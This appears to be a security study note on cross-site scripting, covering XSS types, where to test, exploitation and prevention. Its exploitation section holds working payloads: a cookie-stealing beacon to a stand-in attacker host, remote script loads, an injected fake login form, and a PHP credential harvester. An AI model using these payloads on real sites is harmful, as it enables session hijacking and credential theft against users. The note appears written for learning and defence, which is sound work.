# XSS

## Overview

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. The victim's browser executes the attacker-controlled code in the context of the vulnerable site, enabling cookie theft, session hijacking, phishing, defacement, or actions on behalf of the victim.

There are three primary types:
- **Stored (Persistent) XSS**: Malicious input is saved on the server and served to users later.
- **Reflected (Non-Persistent) XSS**: Input is immediately reflected in the response (often via URL parameters or forms).
- **DOM-based XSS**: The vulnerability exists in client-side JavaScript that processes input unsafely.

## Attack Surface

- Any input field that is later displayed to users (comments, profiles, search results, error messages).
- URL parameters, headers (User-Agent, Cookie, Referer) when their values are rendered.
- Rich text editors and content management systems.
- API responses consumed by frontend JavaScript.
- File uploads whose content or metadata is rendered.

## Identification

- Submit a basic test payload and look for execution: `<script>alert(window.origin)</script>`
- Test in all input points, including non-obvious ones (headers, file metadata).
- Use automated scanners (Burp, ZAP, XSStrike) for initial discovery.
- Look for reflected or stored input without proper output encoding.
- Test context-specific payloads (HTML, JavaScript, attribute contexts).

## Exploitation

### Basic Payloads

```js
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<img src="" onerror=alert(window.origin)>
<script>document.body.style.background = "#141d2b"</script>
<script>new Image().src='http://attacker.example.com/?c='+document.cookie</script>
```

Additional useful payloads:
- `<plaintext>` — stops further HTML rendering.
- `<script>print()</script>` — trigger print dialog.
- `<script src="http://attacker/script.js"></script>` — load external script.
- DOM manipulation: remove elements, change title, overwrite body.

**Context matters:** Payloads must be adapted to where the input is rendered (inside tags, attributes, JavaScript strings, etc.).

### Phishing with XSS

Inject a fake login form that sends credentials to the attacker:

```js
document.write('<h3>Please login to continue</h3><form action=http://attacker-ip><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('originalFormId').remove();
```

Combine with HTML comments `<!--` to clean up remaining legitimate content.

Send the encoded payload to the victim via a link or stored content.

**Simple credential harvester (PHP example):**
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://original-site/");
    fclose($file);
    exit();
}
?>
```

### Blind XSS

Useful for forms only accessible to privileged users (contact forms, support tickets, admin reviews, User-Agent logging).

Inject a script tag that beacons to your server:
```html
<script src="http://attacker-ip/script.js"></script>
```

Use unique paths per field to identify the vulnerable input:
```html
<script src=http://attacker-ip/fullname></script>
```

Advanced detection payloads:
- `<script src=http://attacker-ip></script>`
- `javascript:eval('var a=...')`
- `$.getScript("http://attacker-ip")`

## Impact

- Session hijacking via cookie theft
- Phishing and credential theft
- Actions performed with the victim's privileges (e.g., changing settings, making purchases)
- Keylogging or screen scraping
- Defacement or malware delivery
- Bypassing CSRF protections in some cases when combined with other attacks

## Prevention

- Encode/escape all user-controlled output according to context (HTML, JavaScript, CSS, URLs, attributes).
- Use modern frameworks that provide automatic escaping (React, Angular, etc.).
- Implement a strong Content-Security-Policy (CSP) as defence in depth.
- Sanitize rich HTML input with well-maintained libraries (e.g., DOMPurify).
- Avoid inserting user input into dangerous contexts (innerHTML without sanitization, `eval()`, etc.).
- Validate and encode on both client and server.

## Tools & Payloads

- **Manual testing:** Burp Repeater, browser dev tools
- **Automated:** XSStrike, XSSer, Burp Pro scanner, ZAP
- **Payload collections:**
  - PayloadsAllTheThings XSS section
  - PayloadBox XSS lists
- **Example basic test:**
  ```js
  <script>alert(window.origin)</script>
  ```

**Note:** XSS can appear in HTTP headers (User-Agent, Cookie) when those values are reflected on the page. Test comprehensively.

See the [CSRF](csrf.md) notes for chaining techniques (e.g., XSS + CSRF).
